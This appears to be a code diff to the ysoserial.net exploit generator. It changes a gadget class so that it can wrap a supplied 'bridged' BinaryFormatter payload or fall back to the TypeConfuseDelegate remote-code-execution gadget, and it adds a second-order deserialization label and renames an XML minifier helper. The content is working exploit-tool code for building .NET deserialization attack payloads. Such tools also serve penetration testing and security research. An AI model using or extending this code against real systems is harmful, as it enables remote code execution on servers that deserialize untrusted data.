@@ -30,13 +30,27 @@ namespace ysoserial.Generators
 
         public override List<string> Labels()
         {
-            return new List<string> { GadgetTypes.BridgeAndDerived, "OnDeserialized" };
+            return new List<string> { GadgetTypes.BridgeAndDerived, "OnDeserialized" , "SecondOrderDeserialization"};
+        }
+
+        public override string SupportedBridgedFormatter()
+        {
+            return Formatters.BinaryFormatter;
         }
 
         public override object Generate(string formatter, InputArgs inputArgs)
         {
-            byte[] rceGadget = (byte[])(new TypeConfuseDelegateGenerator()).GenerateWithNoTest("BinaryFormatter", inputArgs);
-            string b64encoded = Convert.ToBase64String(rceGadget);
+            byte[] binaryFormatterPayload;
+            if (BridgedPayload != null)
+            {
+                binaryFormatterPayload = (byte[]) BridgedPayload;
+            }
+            else
+            {
+                binaryFormatterPayload = (byte[]) (new TypeConfuseDelegateGenerator()).GenerateWithNoTest("BinaryFormatter", inputArgs);
+            }
+
+            string b64encoded = Convert.ToBase64String(binaryFormatterPayload);
 
             if (formatter.Equals("binaryformatter", StringComparison.OrdinalIgnoreCase)
                 || formatter.Equals("losformatter", StringComparison.OrdinalIgnoreCase))
@@ -134,7 +148,7 @@ namespace ysoserial.Generators
                 if (inputArgs.Minify)
                 {
 
-                    payload = XmlMinifier.Minify(payload, null, null, FormatterType.SoapFormatter);
+                    payload = XmlHelper.Minify(payload, null, null, FormatterType.SoapFormatter);
 
                 }
 
